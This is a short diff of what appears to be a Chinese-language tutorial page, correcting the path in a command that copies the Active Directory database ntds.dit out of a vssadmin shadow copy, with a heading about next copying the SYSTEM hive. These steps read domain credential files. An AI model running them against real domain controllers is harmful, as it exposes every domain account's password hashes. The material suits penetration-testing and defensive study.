@@ -25,7 +25,7 @@ vssadmin create shadow /for=c:
 ## 从卷影中检索并复制ntds.dit文件到指定目录下
 使用以下命令（登录权限为域管理员权限）：
 {% highlight ruby %}
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\ntds.dit C:\test\ntds.dit
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\test\ntds.dit
 {% endhighlight %}
 ![2](/assets/vssadmin2.png)
 ## 从注册表或卷影中复制SYSTEM文件
